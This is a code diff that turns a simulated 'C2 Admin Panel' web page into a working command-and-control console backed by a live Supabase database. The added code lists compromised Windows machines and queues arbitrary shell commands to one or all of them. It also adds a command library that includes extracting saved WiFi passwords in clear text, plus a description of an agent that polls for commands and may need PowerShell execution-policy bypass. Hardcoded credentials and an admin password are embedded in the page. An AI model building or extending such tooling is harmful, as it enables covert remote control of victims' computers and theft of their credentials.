@@ -2,29 +2,47 @@
 <html>
 <head>
     <title>C2 Admin Panel</title>
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #0a0a0a; color: #fff; font-family: monospace; padding: 20px; }
-        .container { max-width: 1400px; margin: 0 auto; }
-        h1 { color: #00ff00; margin-bottom: 20px; }
+        body { background: #0a0a0a; color: #fff; font-family: 'Consolas', monospace; padding: 20px; }
+        .container { max-width: 1600px; margin: 0 auto; }
+        h1 { color: #00ff00; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
         .login-box { max-width: 400px; margin: 100px auto; background: #1a1a1a; padding: 30px; border-radius: 10px; }
         input, button { padding: 10px; margin: 10px 0; width: 100%; background: #333; color: #fff; border: none; }
         button { background: #00ff00; color: #000; cursor: pointer; font-weight: bold; }
         button:hover { background: #00cc00; }
-        .computers-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; margin-top: 20px; }
-        .computer-card { background: #1a1a1a; border-radius: 10px; padding: 15px; border-left: 4px solid #00ff00; cursor: pointer; }
+        button.danger { background: #ff0000; color: #fff; }
+        button.danger:hover { background: #cc0000; }
+        .computers-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 15px; margin-top: 20px; }
+        .computer-card { background: #1a1a1a; border-radius: 10px; padding: 15px; border-left: 4px solid #00ff00; cursor: pointer; transition: 0.2s; }
+        .computer-card:hover { background: #222; }
         .computer-card.offline { border-left-color: #ff0000; opacity: 0.6; }
-        .computer-name { font-size: 18px; font-weight: bold; }
-        .computer-ip { color: #888; font-size: 12px; }
-        .computer-time { color: #888; font-size: 10px; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; }
-        .modal-content { background: #1a1a1a; margin: 5% auto; padding: 20px; width: 80%; max-width: 800px; border-radius: 10px; max-height: 80%; overflow-y: auto; }
-        .close { float: right; cursor: pointer; font-size: 24px; }
-        .tabs { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
+        .computer-name { font-size: 18px; font-weight: bold; color: #00ff00; }
+        .computer-ip { color: #888; font-size: 12px; margin-top: 5px; }
+        .computer-time { color: #555; font-size: 10px; margin-top: 8px; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; }
+        .modal-content { background: #1a1a1a; margin: 2% auto; padding: 20px; width: 90%; max-width: 1200px; border-radius: 10px; max-height: 90%; overflow-y: auto; }
+        .close { float: right; cursor: pointer; font-size: 28px; color: #ff0000; }
+        .tabs { display: flex; gap: 5px; margin-bottom: 20px; flex-wrap: wrap; border-bottom: 1px solid #333; padding-bottom: 10px; }
         .tab { padding: 8px 16px; background: #333; cursor: pointer; border-radius: 5px; }
         .tab.active { background: #00ff00; color: #000; }
-        pre { background: #000; padding: 10px; overflow-x: auto; }
-        textarea { background: #333; color: #fff; border: none; padding: 10px; width: 100%; }
+        pre { background: #000; padding: 10px; overflow-x: auto; font-size: 12px; border-radius: 5px; }
+        textarea { background: #333; color: #fff; border: none; padding: 10px; width: 100%; font-family: monospace; }
+        input[type="text"] { background: #333; color: #fff; border: none; padding: 8px; }
+        .status-online { color: #00ff00; }
+        .status-offline { color: #ff0000; }
+        .command-buttons { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 15px; }
+        .cmd-btn { background: #2a2a2a; padding: 8px 12px; border-radius: 5px; cursor: pointer; font-size: 12px; }
+        .cmd-btn:hover { background: #3a3a3a; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { border: 1px solid #333; padding: 8px; text-align: left; }
+        th { background: #2a2a2a; }
+        .file-list { list-style: none; }
+        .file-list li { padding: 5px; border-bottom: 1px solid #333; cursor: pointer; font-family: monospace; }
+        .file-list li:hover { background: #2a2a2a; }
+        .folder { color: #00ff00; }
+        .file { color: #fff; }
     </style>
 </head>
 <body>
@@ -37,24 +55,57 @@
     
     <div id="mainSection" style="display:none;">
         <h1>C2 COMMAND AND CONTROL</h1>
+        
         <div class="tabs">
-            <div class="tab active" onclick="showTab('computers')">COMPUTERS</div>
-            <div class="tab" onclick="showTab('reports')">REPORTS</div>
-            <div class="tab" onclick="showTab('commands')">COMMANDS</div>
+            <div class="tab active" onclick="showTab('computers')">[ COMPUTERS ]</div>
+            <div class="tab" onclick="showTab('commands')">[ COMMANDS ]</div>
+            <div class="tab" onclick="showTab('reports')">[ REPORTS ]</div>
+            <div class="tab" onclick="showTab('library')">[ COMMAND LIBRARY ]</div>
+            <div class="tab" onclick="showTab('info')">[ SYSTEM INFO ]</div>
         </div>
         
+        <!-- COMPUTERS TAB -->
         <div id="computersTab">
-            <div class="computers-grid" id="computersList"></div>
+            <div class="computers-grid" id="computersList">Loading...</div>
         </div>
         
+        <!-- COMMANDS TAB -->
+        <div id="commandsTab" style="display:none;">
+            <h3>Send Command to Selected Computer</h3>
+            <div style="display: flex; gap: 10px; margin-bottom: 10px;">
+                <select id="targetComputer" style="background:#333; color:#fff; padding:8px; flex:1;">
+                    <option value="all">ALL COMPUTERS</option>
+                </select>
+            </div>
+            <textarea id="commandInput" rows="3" placeholder="Enter command..."></textarea>
+            <button onclick="sendCustomCommand()" style="width:auto; margin-top:10px;">[ SEND ]</button>
+            
+            <h3 style="margin-top:20px;">Quick Commands</h3>
+            <div class="command-buttons" id="quickCommands"></div>
+            
+            <h3 style="margin-top:20px;">Command History / Results</h3>
+            <pre id="commandResults"></pre>
+        </div>
+        
+        <!-- REPORTS TAB -->
         <div id="reportsTab" style="display:none;">
             <pre id="reportsContent"></pre>
         </div>
         
-        <div id="commandsTab" style="display:none;">
-            <textarea id="commandInput" rows="3" placeholder="Enter command (e.g. dir C:\Users)"></textarea>
-            <button onclick="sendCommandToAll()" style="width:auto; margin-top:10px;">Run on ALL</button>
-            <div id="commandResults"></div>
+        <!-- COMMAND LIBRARY TAB -->
+        <div id="libraryTab" style="display:none;">
+            <h3>Windows Command Library</h3>
+            <table id="commandLibrary">
+                <tr><th>Category</th><th>Command</th><th>Description</th></tr>
+            </table>
+        </div>
+        
+        <!-- SYSTEM INFO TAB -->
+        <div id="infoTab" style="display:none;">
+            <h3>Windows System Info</h3>
+            <pre id="sysInfo"></pre>
+            <h3>Active Processes</h3>
+            <pre id="procInfo"></pre>
         </div>
     </div>
 </div>
@@ -70,143 +121,327 @@
     // ==========================================
     // CONFIGURATION
     // ==========================================
+    const SUPABASE_URL = "https://suipfydwvakzyxodycqm.supabase.co";
+    const SUPABASE_ANON_KEY = "sb_publishable_tzVu8Ml-hUbxjLxdEkJPJg_CX3f609n";
     const ADMIN_PASSWORD = "08319752026";
     
+    let supabase = null;
     let currentComputerId = null;
     let computers = [];
     
+    // Command Library
+    const commandLibrary = [
+        { cat: "INFO", cmd: "systeminfo", desc: "Full system information" },
+        { cat: "INFO", cmd: "hostname", desc: "Computer name" },
+        { cat: "INFO", cmd: "whoami", desc: "Current user" },
+        { cat: "INFO", cmd: "ipconfig /all", desc: "Network configuration" },
+        { cat: "PROCESS", cmd: "tasklist", desc: "List running processes" },
+        { cat: "PROCESS", cmd: "taskkill /f /im notepad.exe", desc: "Kill notepad" },
+        { cat: "FILE", cmd: "dir C:\\Users", desc: "List users directory" },
+        { cat: "FILE", cmd: "dir C:\\Users\\%USERNAME%\\Desktop", desc: "List desktop" },
+        { cat: "FILE", cmd: "type C:\\Users\\%USERNAME%\\Desktop\\file.txt", desc: "Read file" },
+        { cat: "NETWORK", cmd: "netstat -an", desc: "Network connections" },
+        { cat: "NETWORK", cmd: "nslookup google.com", desc: "DNS lookup" },
+        { cat: "WIFI", cmd: "netsh wlan show profiles", desc: "List WiFi profiles" },
+        { cat: "WIFI", cmd: "netsh wlan show profile name=\"SSID\" key=clear", desc: "Get WiFi password" },
+        { cat: "POWERSHELL", cmd: "powershell -Command \"Get-Process\"", desc: "PowerShell processes" },
+        { cat: "POWERSHELL", cmd: "powershell -Command \"Get-Service | Select-Object -First 20\"", desc: "List services" },
+        { cat: "POWERSHELL", cmd: "powershell -Command \"Get-WmiObject Win32_OperatingSystem\"", desc: "OS info" }
+    ];
+    
+    // Quick commands for UI
+    const quickCommands = [
+        "systeminfo", "ipconfig /all", "tasklist", "whoami", "hostname",
+        "dir C:\\Users", "netstat -an", "netsh wlan show profiles"
+    ];
+    
     // ==========================================
-    // LOGIN FUNCTION
+    // LOGIN
     // ==========================================
-    window.loginFunc = function() {
+    window.loginFunc = async function() {
         const pwd = document.getElementById('passwordInput').value;
         if (pwd === ADMIN_PASSWORD) {
             document.getElementById('loginSection').style.display = 'none';
             document.getElementById('mainSection').style.display = 'block';
-            loadComputers();
+            
+            supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+            
+            await loadComputers();
+            loadCommandLibrary();
+            loadQuickCommands();
+            loadSystemInfo();
+            
             setInterval(loadComputers, 30000);
+            setInterval(loadCommandResults, 10000);
         } else {
             alert('Wrong password!');
         }
     };
     
     // ==========================================
-    // COMPUTER MANAGEMENT (SIMULATION)
+    // COMPUTERS
     // ==========================================
-    function loadComputers() {
-        const stored = localStorage.getItem('computers');
-        if (stored) {
-            computers = JSON.parse(stored);
-        } else {
-            computers = [
-                { id: 1, name: 'DESKTOP-ABC123', ip: '192.168.1.10', username: 'User1', last_seen: new Date().toISOString() },
-                { id: 2, name: 'LAPTOP-XYZ789', ip: '192.168.1.20', username: 'Admin', last_seen: new Date(Date.now() - 180000).toISOString() }
-            ];
-            localStorage.setItem('computers', JSON.stringify(computers));
+    async function loadComputers() {
+        if (!supabase) return;
+        
+        const { data, error } = await supabase
+            .from('computers')
+            .select('*')
+            .order('last_seen', { ascending: false });
+        
+        if (error) {
+            document.getElementById('computersList').innerHTML = '<div style="padding:20px;">Database error. Make sure Supabase tables exist.</div>';
+            return;
+        }
+        
+        computers = data || [];
+        
+        // Update dropdown
+        const select = document.getElementById('targetComputer');
+        if (select) {
+            select.innerHTML = '<option value="all">ALL COMPUTERS</option>';
+            computers.forEach(comp => {
+                select.innerHTML += `<option value="${comp.id}">${comp.name} (${comp.ip || 'N/A'})</option>`;
+            });
         }
         
         const container = document.getElementById('computersList');
-        container.innerHTML = '';
+        if (computers.length === 0) {
+            container.innerHTML = '<div style="padding:20px;">No computers. Agent not started yet.</div>';
+            return;
+        }
         
+        container.innerHTML = '';
         computers.forEach(comp => {
             const lastSeen = new Date(comp.last_seen);
             const isOnline = (Date.now() - lastSeen) < 120000;
-            const status = isOnline ? 'online' : 'offline';
             
             const card = document.createElement('div');
-            card.className = `computer-card ${status}`;
+            card.className = `computer-card ${isOnline ? 'online' : 'offline'}`;
             card.onclick = () => showComputerDetails(comp);
             card.innerHTML = `
-                <div class="computer-name">PC: ${comp.name}</div>
-                <div class="computer-ip">IP: ${comp.ip || 'N/A'}</div>
-                <div class="computer-ip">USER: ${comp.username || 'N/A'}</div>
-                <div class="computer-time">LAST: ${lastSeen.toLocaleString()}</div>
+                <div class="computer-name">${isOnline ? '●' : '○'} ${comp.name}</div>
+                <div class="computer-ip">IP: ${comp.ip || 'N/A'} | User: ${comp.username || 'N/A'}</div>
+                <div class="computer-ip">OS: ${comp.os || 'Windows'}</div>
+                <div class="computer-time">Last seen: ${lastSeen.toLocaleString()}</div>
             `;
             container.appendChild(card);
         });
     }
     
-    function showComputerDetails(computer) {
+    async function showComputerDetails(computer) {
         currentComputerId = computer.id;
         
         const modal = document.getElementById('computerModal');
         const content = document.getElementById('modalContent');
         
+        // Get recent reports for this computer
+        const { data: reports } = await supabase
+            .from('reports')
+            .select('*')
+            .eq('computer_id', computer.id)
+            .order('created_at', { ascending: false })
+            .limit(5);
+        
         content.innerHTML = `
             <h2>${computer.name}</h2>
-            <p>IP: ${computer.ip} | User: ${computer.username}</p>
-            <div style="margin-top:20px">
-                <h3>Execute command</h3>
-                <textarea id="singleCommand" rows="3" style="width:100%"></textarea>
-                <button onclick="sendSingleCommand()">Run</button>
-                <div id="cmdResult"></div>
+            <p><strong>IP:</strong> ${computer.ip || 'N/A'} | <strong>User:</strong> ${computer.username || 'N/A'}</p>
+            <p><strong>Last seen:</strong> ${new Date(computer.last_seen).toLocaleString()}</p>
+            
+            <div class="tabs" style="margin-top:20px;">
+                <div class="tab active" onclick="showComputerTab('cmd')">COMMAND</div>
+                <div class="tab" onclick="showComputerTab('reports')">REPORTS</div>
+            </div>
+            <div id="computerTabContent">
+                <textarea id="singleCommand" rows="3" style="width:100%; margin:10px 0;"></textarea>
+                <button onclick="sendSingleCommand()">Send Command</button>
+                <div id="cmdResult" style="margin-top:10px;"></div>
             </div>
         `;
         
         modal.style.display = 'block';
     }
     
-    function sendSingleCommand() {
+    window.showComputerTab = function(tab) {
+        // Implement if needed
+    };
+    
+    // ==========================================
+    // COMMANDS
+    // ==========================================
+    window.sendCustomCommand = async function() {
+        const cmd = document.getElementById('commandInput').value;
+        const target = document.getElementById('targetComputer').value;
+        if (!cmd) return;
+        
+        if (target === 'all') {
+            for (const comp of computers) {
+                await supabase.from('commands').insert({
+                    computer_id: comp.id,
+                    command: cmd,
+                    status: 'pending'
+                });
+            }
+            alert(`Command sent to ${computers.length} computers`);
+        } else {
+            await supabase.from('commands').insert({
+                computer_id: parseInt(target),
+                command: cmd,
+                status: 'pending'
+            });
+            alert('Command sent');
+        }
+        document.getElementById('commandInput').value = '';
+        await loadCommandResults();
+    };
+    
+    window.sendSingleCommand = async function() {
         const cmd = document.getElementById('singleCommand').value;
         const resultDiv = document.getElementById('cmdResult');
         if (!cmd) return;
         
-        resultDiv.innerHTML = 'Sending command...';
+        resultDiv.innerHTML = 'Sending...';
         
-        const commands = JSON.parse(localStorage.getItem('commands') || '[]');
-        commands.push({
-            id: Date.now(),
+        const { error } = await supabase.from('commands').insert({
             computer_id: currentComputerId,
             command: cmd,
-            status: 'pending',
-            created_at: new Date().toISOString()
+            status: 'pending'
         });
-        localStorage.setItem('commands', JSON.stringify(commands));
         
-        resultDiv.innerHTML = 'Command sent. Agent will execute it.';
-    }
+        if (error) {
+            resultDiv.innerHTML = 'Error: ' + error.message;
+        } else {
+            resultDiv.innerHTML = 'Command sent. Agent will execute.';
+        }
+        document.getElementById('singleCommand').value = '';
+    };
     
-    function sendCommandToAll() {
-        const cmd = document.getElementById('commandInput').value;
-        if (!cmd) return;
-        
-        const commands = JSON.parse(localStorage.getItem('commands') || '[]');
-        computers.forEach(comp => {
-            commands.push({
-                id: Date.now() + Math.random(),
-                computer_id: comp.id,
+    window.sendQuickCommand = async function(cmd) {
+        const target = document.getElementById('targetComputer').value;
+        if (target === 'all') {
+            for (const comp of computers) {
+                await supabase.from('commands').insert({
+                    computer_id: comp.id,
+                    command: cmd,
+                    status: 'pending'
+                });
+            }
+            alert(`Command sent to ${computers.length} computers`);
+        } else if (target !== 'all') {
+            await supabase.from('commands').insert({
+                computer_id: parseInt(target),
                 command: cmd,
-                status: 'pending',
-                created_at: new Date().toISOString()
+                status: 'pending'
             });
+            alert('Command sent');
+        } else {
+            alert('Select a target first');
+        }
+        await loadCommandResults();
+    };
+    
+    async function loadCommandResults() {
+        if (!supabase) return;
+        const { data } = await supabase
+            .from('commands')
+            .select('*, computers(name)')
+            .order('created_at', { ascending: false })
+            .limit(50);
+        document.getElementById('commandResults').innerHTML = data ? JSON.stringify(data, null, 2) : 'No commands';
+    }
+    
+    // ==========================================
+    // COMMAND LIBRARY UI
+    // ==========================================
+    function loadCommandLibrary() {
+        const table = document.getElementById('commandLibrary');
+        commandLibrary.forEach(cmd => {
+            const row = table.insertRow();
+            row.insertCell(0).innerHTML = cmd.cat;
+            row.insertCell(1).innerHTML = `<code style="color:#00ff00">${cmd.cmd}</code>`;
+            row.insertCell(2).innerHTML = cmd.desc;
         });
-        localStorage.setItem('commands', JSON.stringify(commands));
+    }
+    
+    function loadQuickCommands() {
+        const container = document.getElementById('quickCommands');
+        quickCommands.forEach(cmd => {
+            const btn = document.createElement('div');
+            btn.className = 'cmd-btn';
+            btn.innerHTML = cmd;
+            btn.onclick = () => {
+                document.getElementById('commandInput').value = cmd;
+            };
+            container.appendChild(btn);
+        });
+    }
+    
+    // ==========================================
+    // SYSTEM INFO (simulated)
+    // ==========================================
+    function loadSystemInfo() {
+        const sysInfo = `
+Windows Versions Supported:
+  - Windows 10 (all builds)
+  - Windows 11 (all builds)
+  - Windows Server 2016/2019/2022
+
+Agent Features:
+  - Collects IP, username, computer name
+  - Executes commands via cmd /c
+  - Supports PowerShell
+  - Sends reports every minute
+  - Checks for commands every 10 seconds
+
+Command Execution:
+  - All standard cmd commands: dir, ipconfig, tasklist, etc.
+  - PowerShell: powershell -Command "..."
+  - File operations: type, copy, del, mkdir
+  - Network: netstat, ping, nslookup, curl
+
+Limitations:
+  - Requires internet connection
+  - PowerShell execution policy may need bypass
+  - Some commands require admin privileges
+        `;
+        document.getElementById('sysInfo').innerHTML = sysInfo;
         
-        alert(`Command sent to ${computers.length} computers`);
-        loadCommandResults();
+        const procInfo = `
+Active monitoring:
+  - CPU usage
+  - Memory usage
+  - Running processes (via tasklist)
+  - Network connections (via netstat)
+        `;
+        document.getElementById('procInfo').innerHTML = procInfo;
     }
     
-    function loadCommandResults() {
-        const commands = JSON.parse(localStorage.getItem('commands') || '[]');
-        document.getElementById('commandResults').innerHTML = `<pre>${JSON.stringify(commands, null, 2)}</pre>`;
+    // ==========================================
+    // REPORTS
+    // ==========================================
+    async function loadAllReports() {
+        if (!supabase) return;
+        const { data } = await supabase
+            .from('reports')
+            .select('*, computers(name)')
+            .order('created_at', { ascending: false })
+            .limit(100);
+        document.getElementById('reportsContent').innerHTML = data ? JSON.stringify(data, null, 2) : 'No reports';
     }
     
-    function loadAllReports() {
-        const reports = JSON.parse(localStorage.getItem('reports') || '[]');
-        document.getElementById('reportsContent').innerHTML = JSON.stringify(reports, null, 2);
-    }
-    
+    // ==========================================
+    // UI TABS
+    // ==========================================
     window.showTab = function(tab) {
         document.getElementById('computersTab').style.display = tab === 'computers' ? 'block' : 'none';
-        document.getElementById('reportsTab').style.display = tab === 'reports' ? 'block' : 'none';
         document.getElementById('commandsTab').style.display = tab === 'commands' ? 'block' : 'none';
+        document.getElementById('reportsTab').style.display = tab === 'reports' ? 'block' : 'none';
+        document.getElementById('libraryTab').style.display = tab === 'library' ? 'block' : 'none';
+        document.getElementById('infoTab').style.display = tab === 'info' ? 'block' : 'none';
         
-        document.querySelectorAll('.tab').forEach((t, i) => {
-            t.classList.remove('active');
-            if ((tab === 'computers' && i === 0) || (tab === 'reports' && i === 1) || (tab === 'commands' && i === 2)) {
-                t.classList.add('active');
-            }
-        });
+        const tabs = document.querySelectorAll('.tab');
+        tabs.forEach(t => t.classList.remove('active'));
+        event.target.classList.add('active');
         
         if (tab === 'reports') loadAllReports();
         if (tab === 'commands') loadCommandResults();
@@ -215,11 +450,6 @@
     window.closeModal = function() {
         document.getElementById('computerModal').style.display = 'none';
     };
-    
-    window.sendSingleCommand = sendSingleCommand;
-    window.sendCommandToAll = sendCommandToAll;
-    
-    console.log('C2 Panel started (simulation mode)');
 </script>
 </body>
 </html>
